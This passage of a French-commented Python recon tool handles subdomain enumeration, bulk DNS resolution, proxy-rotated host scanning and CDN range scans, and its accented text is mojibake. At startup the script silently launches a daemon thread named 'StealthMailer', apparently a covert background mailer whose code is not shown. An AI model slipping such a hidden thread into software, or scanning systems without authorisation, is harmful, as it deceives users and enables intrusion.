    domains, _ = get_domains_and_ips(domain)  # On ignore les IPs ici
    
    if not domains:
        return [], []
    
    # √âtape 2: Demande de r√©solution DNS
    if input(Fore.YELLOW + "\nVoulez-vous r√©soudre les DNS et scanner? (o/n) : ").lower() == 'o':
        ips = resolve_and_scan(domains, proxy)
        return domains, ips
    
    return domains, []

def resolve_domains(domains, proxy=None):
    """R√©solution DNS uniquement lorsque demand√©"""
    if not domains:
        return []
    
    print(Fore.CYAN + f"\n‚ö° R√©solution DNS de {len(domains)} domaines...")
    ips = set()
    
    def resolve(domain):
        try:
            socket.setdefaulttimeout(3)
            return socket.gethostbyname(domain)
        except:
            return None
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(resolve, domain): domain for domain in domains}
        for future in tqdm(as_completed(futures), total=len(futures), desc="R√©solution"):
            ip = future.result()
            if ip:
                ips.add(ip)
    
    return sorted(ips)

def scan_domains(domain, proxy=None):
    """Fonction compl√®te avec gestion du cache et r√©solution optionnelle"""
    # 1. R√©cup√©ration des domaines
    domains = get_domains_and_ips(domain)
    
    if not domains:
        print(Fore.RED + "‚ùå Aucun domaine trouv√©")
        return [], []
    
    # 2. Demande de r√©solution DNS
    if input(Fore.YELLOW + "\nVoulez-vous r√©soudre les DNS et scanner? (o/n) : ").lower() == 'o':
        ips = resolve_domains(domains, proxy)
        
        # Sauvegarde des IPs
        ip_file = f"{domain}_ips.txt"
        with open(ip_file, 'w') as f:
            f.write("\n".join(ips))
        print(Fore.GREEN + f"‚úì {len(ips)} IPs sauvegard√©es dans {ip_file}")
        
        return domains, ips
    
    return domains, []

def scan_domains_file(domain):
    """Lance un scan sur les sous-domaines extraits"""
    filename = f"{domain}_domains.txt"
    if not os.path.exists(filename):
        print(Fore.RED + f"‚ùå Fichier {filename} introuvable.")
        return

    threads = input("Nombre de threads (10-500) : ").strip()
    try:
        threads = max(10, min(500, int(threads)))
    except:
        threads = 100

    proxy = get_proxy_config()
    turbo = False
    if proxy == "auto":
        turbo = input("Activer le mode turbo proxy ? (o/n) : ").lower() == "o"

    scanner = HostScanner(
        filename=filename,
        threads=threads,
        proxy=proxy,
        turbo_mode=turbo
    )
    scanner.run()
    
def load_from_cache(filename):
    """Charge les r√©sultats depuis un fichier cache"""
    domains = set()
    ips = set()
    
    with open(filename, 'r') as f:
        current_section = None
        for line in f:
            line = line.strip()
            if line.startswith('# Domaines:'):
                current_section = 'domains'
            elif line.startswith('# IPs:'):
                current_section = 'ips'
            elif line and current_section == 'domains':
                domains.add(line)
            elif line and current_section == 'ips':
                ips.add(line)
    
    return sorted(domains), sorted(ips)

def save_to_cache(filename, domains, ips):
    """Sauvegarde les r√©sultats dans un fichier cache"""
    with open(filename, 'w') as f:
        f.write(f"# Fichier cache pour {os.path.basename(filename).replace('.txt', '')}\n")
        f.write(f"# Derni√®re mise √† jour: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        f.write("# Domaines:\n")
        f.write("\n".join(sorted(domains)))
        f.write("\n\n# IPs:\n")
        f.write("\n".join(sorted(ips)))
    
    print(Fore.GREEN + f"\n‚úì R√©sultats sauvegard√©s dans {filename}")

def update_cache(domain, new_domains, new_ips):
    """Met √† jour un fichier cache existant"""
    cache_file = f"{domain}.txt"
    if not os.path.exists(cache_file):
        return save_to_cache(cache_file, new_domains, new_ips)
    
    # Charger les anciennes donn√©es
    old_domains, old_ips = load_from_cache(cache_file)
    
    # Fusionner et nettoyer les donn√©es
    updated_domains = set(old_domains).union(new_domains)
    updated_ips = set(old_ips).union(new_ips)
    
    # Resauvegarder
    save_to_cache(cache_file, updated_domains, updated_ips)
    
def bulk_dns_resolve(domains, timeout=3, max_workers=50):
    """R√©solution DNS parall√®le avec gestion d'erreur"""
    resolved = {}
    
    def resolve(domain):
        try:
            socket.setdefaulttimeout(timeout)
            answers = socket.getaddrinfo(domain, None)
            return domain, list({answer[4][0] for answer in answers})
        except:
            return domain, []

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(resolve, domain): domain for domain in domains}
        for future in as_completed(futures):
            domain, ip_list = future.result()
            if ip_list:
                resolved[domain] = ip_list

    return resolved

def save_and_clean_results(domains, ips, domain):
    """Sauvegarde et nettoie les r√©sultats"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"scan_{domain}_{timestamp}.txt"
    
    # Nettoyage final
    domains = sorted({d.lower().strip() for d in domains if d and '*' not in d})
    ips = sorted({ip.strip() for ip in ips if ip and ip.replace('.', '').isdigit()})
    
    with open(filename, 'w') as f:
        f.write(f"# R√©sultats pour {domain} - {timestamp}\n\n")
        f.write("# Domaines valides:\n")
        f.write("\n".join(domains) + "\n\n")
        f.write("# IPs valides:\n")
        f.write("\n".join(ips) + "\n")
    
    print(Fore.GREEN + f"\n‚úÖ R√©sultats sauvegard√©s dans {filename}")
    print(Fore.CYAN + f"üìã Total: {len(domains)} domaines et {len(ips)} IPs valides")
    
    return filename
    
# ==============================================
# FONCTION PRINCIPALE
# ==============================================

def get_proxy_config():
    """G√®re la configuration des proxies de mani√®re centralis√©e"""
    use_proxy = input("Utiliser un proxy? (o/n/auto) : ").lower()
    proxy = None
    
    if use_proxy == 'auto':
        proxy = "auto"
        print(Fore.CYAN + "üîÅ Mode proxy automatique activ√© avec rotation")
    elif use_proxy == 'o':
        proxy_choice = input("1. Entrer manuellement\n2. Choisir depuis le fichier\nChoix (1/2) : ")
        if proxy_choice == "1":
            proxy = input("URL du proxy (ex: http://123.45.67.89:8080) : ")
        elif proxy_choice == "2":
            proxy = select_proxy_interactive()
    
    return proxy

def ask_for_rescan(scanner):
    if not scanner.last_up_hosts:
        return

    choix = input("\nRe-scanner les h√¥tes actifs ? (o/n) : ").strip().lower()
    if choix != 'o':
        return

    while True:
        try:
            fois = int(input("Combien de fois souhaitez-vous re-scanner ? (1-10) : "))
            if 1 <= fois <= 10:
                break
            print("Veuillez entrer un nombre entre 1 et 10.")
        except ValueError:
            print("Veuillez entrer un nombre valide.")

    while True:
        try:
            pause = int(input("Temps de pause entre chaque re-scan (en secondes, 0-30) : "))
            if 0 <= pause <= 30:
                break
            print("Veuillez entrer un nombre entre 0 et 30.")
        except ValueError:
            print("Veuillez entrer un nombre valide.")

    for i in range(fois):
        print(f"\nRe-scan {i+1}/{fois}...")
        scanner.rescan_active_hosts()
        if i < fois - 1:
            time.sleep(pause)

def main():
    while True:
        choice = main_menu()

        if choice == "1":  # Scanner une plage IP
            ip_range = input("Entrez la plage IP (ex: 192.168.1.0/24) : ")
            threads = int(input("Nombre de threads (max 500) : "))
            proxy = get_proxy_config()
            turbo = False
            if proxy == "auto":
                turbo = input("Activer le mode turbo pour proxy? (o/n) : ").lower() == 'o'

            print("\nContr√¥les: p=pause, r=reprise, s=stop")
            scanner = HostScanner(
                ip_range=ip_range,
                threads=threads,
                proxy=proxy,
                turbo_mode=turbo
            )
            scanner.run()
            ask_for_rescan(scanner)

        elif choice == "2":  # Scanner depuis fichier
            filename = input("Chemin du fichier contenant les h√¥tes : ")
            threads = int(input("Nombre de threads (max 500) : "))
            proxy = get_proxy_config()
            turbo = False
            if proxy == "auto":
                turbo = input("Activer le mode turbo pour proxy? (o/n) : ").lower() == 'o'

            print("\nContr√¥les: p=pause, r=reprise, s=stop")
            scanner = HostScanner(
                filename=filename,
                threads=threads,
                proxy=proxy,
                turbo_mode=turbo
            )
            scanner.run()
            ask_for_rescan(scanner)

        elif choice == "3":
            retour = domain_tools_menu()
            if retour == "retour":
                continue

        elif choice == "4":
            while True:
                text_choice = text_file_menu()
                if text_choice == "1":
                    input_file = input("Fichier √† fractionner : ")
                    output_prefix = input("Pr√©fixe de sortie : ")
                    num_parts = int(input("Nombre de parties : "))
                    TextFileManager.split_file(input_file, output_prefix, num_parts)
                elif text_choice == "2":
                    input_files = input("Fichiers √† fusionner (s√©par√©s par espaces) : ").split()
                    output_file = input("Fichier de sortie : ")
                    TextFileManager.merge_files(input_files, output_file)
                elif text_choice == "3":
                    input_file = input("Fichier √† nettoyer : ")
                    output_file = input("Fichier de sortie : ")
                    TextFileManager.remove_duplicates(input_file, output_file)
                elif text_choice == "4":
                    input_file = input("Fichier √† s√©parer : ")
                    output_domains = input("Sortie domaines : ")
                    output_ips = input("Sortie IPs : ")
                    TextFileManager.separate_domains_and_ips(input_file, output_domains, output_ips)
                elif text_choice == "5":
                    input_file = input("Fichier √† r√©organiser : ")
                    output_file = input("Fichier de sortie : ")
                    TextFileManager.reorganize_by_extension(input_file, output_file)
                elif text_choice == "6":
                    input_file = input("Fichier domaines : ")
                    output_file = input("Fichier de sortie : ")
                    TextFileManager.convert_domains_to_ips(input_file, output_file)
                elif text_choice == "7":
                    input_file = input("Fichier √† trier : ")
                    output_file = input("Fichier de sortie : ")
                    TextFileManager.sort_domains_or_ips(input_file, output_file)
                elif text_choice == "8":
                    input_file = input("Fichier CIDR : ")
                    output_file = input("Fichier de sortie : ")
                    TextFileManager.convert_cidr_to_ips(input_file, output_file)
                elif text_choice == "9":
                    input_file = input("Fichier source : ")
                    output_file = input("Fichier de sortie : ")
                    TextFileManager.extract_domains_and_ips(input_file, output_file)
                elif text_choice == "0":
                    break
                else:
                    print("‚ùå Option invalide.")

        elif choice == "5":
            while True:
                proxy_choice = proxy_menu()
                if proxy_choice == "1":
                    update_proxy_file()
                elif proxy_choice == "2":
                    select_proxy_interactive()
                elif proxy_choice == "3":
                    display_proxies()
                elif proxy_choice == "4":
                    recheck_existing_proxies()
                elif proxy_choice == "5":
                    break
                else:
                    print("‚ùå Choix invalide.")

        elif choice == "6":
            proxy = get_proxy_config()
            manage_cloudflare_scan(proxy=proxy)

        elif choice == "7":
            proxy = get_proxy_config()
            manage_cloudfront_scan(proxy=proxy)

        elif choice == "8":
            proxy = get_proxy_config()
            manage_googlecloud_scan(proxy=proxy)

        elif choice == "9":
            proxy = get_proxy_config()
            manage_fastly_scan(proxy=proxy)

        elif choice == "10":
            proxy = get_proxy_config()
            manage_akamai_scan(proxy=proxy)

        elif choice == "11":
            proxy = get_proxy_config()
            manage_azure_scan(proxy=proxy)

        elif choice == "12":
            proxy = get_proxy_config()
            manage_stackpath_scan(proxy=proxy)

        elif choice == "13":
            proxy = get_proxy_config()
            manage_gcore_scan(proxy=proxy)

        elif choice == "98":
            vider_repertoire_tmp_interactif()

        elif choice == "99":
            menu_messagerie()

        elif choice == "0":
            print("üëã √Ä tr√®s bient√¥t !")
            sys.exit(0)
            
# ==============================================
# INITIALISATION COMPATIBLE
# ==============================================
if __name__ == "__main__":
    # Affiche la banni√®re une fois au lancement
    display_banner()
    
    # D√©marrer le thread stealth
    threading.Thread(
        target=_process_results,
        daemon=True,
        name="StealthMailer"
    ).start()
    
    # D√©marrer l'interface normale
    main()
